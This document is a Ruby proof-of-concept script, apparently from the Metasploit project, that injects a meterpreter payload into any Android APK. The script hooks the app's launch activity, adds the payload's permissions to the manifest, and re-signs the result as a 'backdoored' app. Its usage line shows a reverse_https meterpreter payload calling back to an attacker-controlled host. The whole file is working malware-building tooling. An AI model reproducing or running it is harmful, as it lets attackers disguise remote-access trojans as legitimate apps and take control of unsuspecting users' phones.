#!/usr/bin/env ruby
#
# This script is a POC for injecting metasploit payloads on 
# arbitrary APKs.
# Authored by timwr, Jack64
#

require 'tmpdir'
require 'nokogiri'
require 'fileutils'
require 'optparse'
require 'open3'


def run_cmd(cmd)
   begin
     stdin, stdout, stderr = Open3.popen3(cmd)
     return stdout.read + stderr.read
   rescue Errno::ENOENT
     return nil
   end
end


# Find the activity that is opened when you click the app icon
def find_launcher_activity(amanifest)
    package = amanifest.xpath("//manifest").first['package']
    activities = amanifest.xpath("//activity|//activity-alias")
    for activity in activities 
        activityname = activity.attribute("name")
        category = activity.search('category')
        unless category
            next
        end
        for cat in category
            categoryname = cat.attribute('name')
            if (categoryname.to_s == 'android.intent.category.LAUNCHER' || categoryname.to_s == 'android.intent.action.MAIN')
                activityname = activityname.to_s
                unless activityname.start_with?(package)
                    activityname = package + activityname
                end
                return activityname
            end
        end
    end
end

# If XML parsing of the manifest fails, recursively search
# the smali code for the onCreate() hook and let the user
# pick the injection point

def scrape_files_for_launcher_activity(tempdir)
	smali_files||=[]
	Dir.glob("#{tempdir}/original/smali*/**/*.smali") do |file|
	  checkFile=File.read(file)
	  if (checkFile.include?";->onCreate(Landroid/os/Bundle;)V")
		smali_files << file
		smalifile = file
		activitysmali = checkFile
	  end
	end
	i=0
	print "[*] Please choose from one of the following:\n"
	smali_files.each{|s_file|
		print "[+] Hook point ",i,": ",s_file,"\n"
		i+=1
	}
	hook=-1
	while (hook < 0 || hook>i)
		print "\nHook: "
		hook = STDIN.gets.chomp.to_i
	end
	i=0
	smalifile=""
	activitysmali=""
	smali_files.each{|s_file|
		if (i==hook)
			checkFile=File.read(s_file)
			smalifile=s_file
			activitysmali = checkFile
			break
		end
		i+=1
	}
	return [smalifile,activitysmali]
end

def fix_manifest(tempdir)
	payload_permissions=[]

	#Load payload's permissions
	File.open("#{tempdir}/payload/AndroidManifest.xml","r"){|file|
		k=File.read(file)
		payload_manifest=Nokogiri::XML(k)
		permissions = payload_manifest.xpath("//manifest/uses-permission")
		for permission in permissions
			name=permission.attribute("name")
			payload_permissions << name.to_s
		end
	}

	original_permissions=[]
	apk_mani=""

	#Load original apk's permissions
	File.open("#{tempdir}/original/AndroidManifest.xml","r"){|file2|
		k=File.read(file2)
		apk_mani=k
		original_manifest=Nokogiri::XML(k)
		permissions = original_manifest.xpath("//manifest/uses-permission")
		for permission in permissions
			name=permission.attribute("name")
			original_permissions << name.to_s
		end
	}

	#Get permissions that are not in original APK
	add_permissions=[]
	for permission in payload_permissions
		if !(original_permissions.include? permission)
			print "[*] Adding #{permission}\n"
			add_permissions << permission
		end
	end

	inject=0
	new_mani=""
	#Inject permissions in original APK's manifest
	for line in apk_mani.split("\n")
		if (line.include? "uses-permission" and inject==0)
			for permission in add_permissions
				new_mani << '<uses-permission android:name="'+permission+'"/>'+"\n"
			end
			new_mani << line+"\n"
			inject=1
		else
			new_mani << line+"\n"
		end
	end
	File.open("#{tempdir}/original/AndroidManifest.xml", "w") {|file| file.puts new_mani }
end

apkfile = ARGV[0]
unless(apkfile && File.readable?(apkfile))
	puts "Usage: #{$0} [target.apk] [msfvenom options]\n"
	puts "e.g. #{$0} messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443\n"
	exit(1)
end

jarsigner = run_cmd("jarsigner")
unless(jarsigner != nil)
	puts "[-] Jarsigner not found. If it's not in your PATH, please add it.\n"
	exit(1)
end

apktool = run_cmd("apktool")
unless(apktool != nil)
	puts "[-] APKTool not found. If it's not in your PATH, please add it.\n"
	exit(1)
end

apk_v = apktool
unless(apk_v.split()[1].include?("v2."))
	puts "[-] Apktool version #{apk_v} not supported, please download the latest 2.xx version from git.\n"
	exit(1)
end

begin
	msfvenom_opts = ARGV[1,ARGV.length]
	opts=""
	msfvenom_opts.each{|x|
	opts+=x
	opts+=" "
	}
rescue
	puts "Usage: #{$0} [target.apk] [msfvenom options]\n"
	puts "e.g. #{$0} messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443\n"
	puts "[-] Error parsing msfvenom options. Exiting.\n"
	exit(1)
end

#Create temporary directory where work will be done
tempdir = Dir.mktmpdir

print "[*] Generating msfvenom payload..\n"
res = run_cmd("../msfvenom -f raw #{opts} -o #{tempdir}/payload.apk 2>&1")
if res.downcase.include?("invalid" || "error")
	puts res
	exit(1)
end

print "[*] Signing payload..\n"                                                                                                        
run_cmd("jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA #{tempdir}/payload.apk androiddebugkey")

run_cmd("cp #{apkfile} #{tempdir}/original.apk")

print "[*] Decompiling orignal APK..\n"
run_cmd("apktool d #{tempdir}/original.apk -o #{tempdir}/original")
print "[*] Decompiling payload APK..\n"
run_cmd("apktool d #{tempdir}/payload.apk -o #{tempdir}/payload")
               
f = File.open("#{tempdir}/original/AndroidManifest.xml")
amanifest = Nokogiri::XML(f)
f.close

print "[*] Locating onCreate() hook..\n"

launcheractivity = find_launcher_activity(amanifest)
smalifile = "#{tempdir}/original/smali/" + launcheractivity.gsub(/\./, "/") + ".smali"
begin
	activitysmali = File.read(smalifile)
rescue Errno::ENOENT
	print "[!] Unable to find correct hook automatically\n"
	begin
		results=scrape_files_for_launcher_activity(tempdir)
		smalifile=results[0]
		activitysmali=results[1]
	rescue
		puts "[-] Error finding launcher activity. Exiting"
		exit(1)
	end
end

print "[*] Copying payload files..\n"
FileUtils.mkdir_p("#{tempdir}/original/smali/com/metasploit/stage/")
FileUtils.cp Dir.glob("#{tempdir}/payload/smali/com/metasploit/stage/Payload*.smali"), "#{tempdir}/original/smali/com/metasploit/stage/"
activitycreate = ';->onCreate(Landroid/os/Bundle;)V'
payloadhook = activitycreate + "\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
hookedsmali = activitysmali.gsub(activitycreate, payloadhook)
print "[*] Loading ",smalifile," and injecting payload..\n"
File.open(smalifile, "w") {|file| file.puts hookedsmali }
injected_apk=apkfile.split(".")[0]
injected_apk+="_backdoored.apk"

print "[*] Poisoning the manifest with meterpreter permissions..\n"
fix_manifest(tempdir)

print "[*] Rebuilding #{apkfile} with meterpreter injection as #{injected_apk}..\n"
run_cmd("apktool b -o #{tempdir}/#{injected_apk} #{tempdir}/original")
print "[*] Signing #{injected_apk} ..\n"                                                                                               
run_cmd("jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA #{tempdir}/#{injected_apk} androiddebugkey")

run_cmd("cp #{tempdir}/#{injected_apk} .")
FileUtils.remove_entry tempdir

puts "[+] Infected file #{injected_apk} ready.\n"

